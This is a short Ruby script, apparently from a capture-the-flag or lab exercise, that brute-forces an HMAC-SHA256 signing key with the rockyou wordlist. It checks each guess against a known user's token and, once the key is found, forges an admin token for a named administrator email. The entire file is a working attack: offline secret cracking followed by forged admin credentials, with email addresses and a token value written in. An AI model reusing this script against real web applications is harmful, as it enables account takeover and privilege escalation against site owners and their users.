#!/usr/bin/env ruby

require 'openssl'

WORDLIST = '/home/malik/Documents/Wordlists/rockyou.txt'
# this can be any valid email address that had been registered with
EMAIL = 'laid.dimaria@gmail.com'
# the token associated with the email address
TOKEN = 'cc3689ad6276af252de5e1dd76e378062497d31618ad581c8ea8f111f29581ae'
ADMIN_EMAIL = 'spidersweb.manager@gmail.com'

begin
  # read wordlist file line by line
  File.open(WORDLIST).each_line do |line|
    # remove newline
    key = line[0..-2]
    puts "[*] Trying key : #{key}"

    # check if the token matches the one being generated
    if TOKEN == OpenSSL::HMAC.hexdigest("SHA256", key, EMAIL)
      puts "\n[+] Found valid SECRET_KEY : #{key}\n"

      # generate admin token
      admin_token = OpenSSL::HMAC.hexdigest("SHA256", key, ADMIN_EMAIL)
      puts "[+] Admin token : #{admin_token}"

      # break out of the block
      break
    end
  end
end
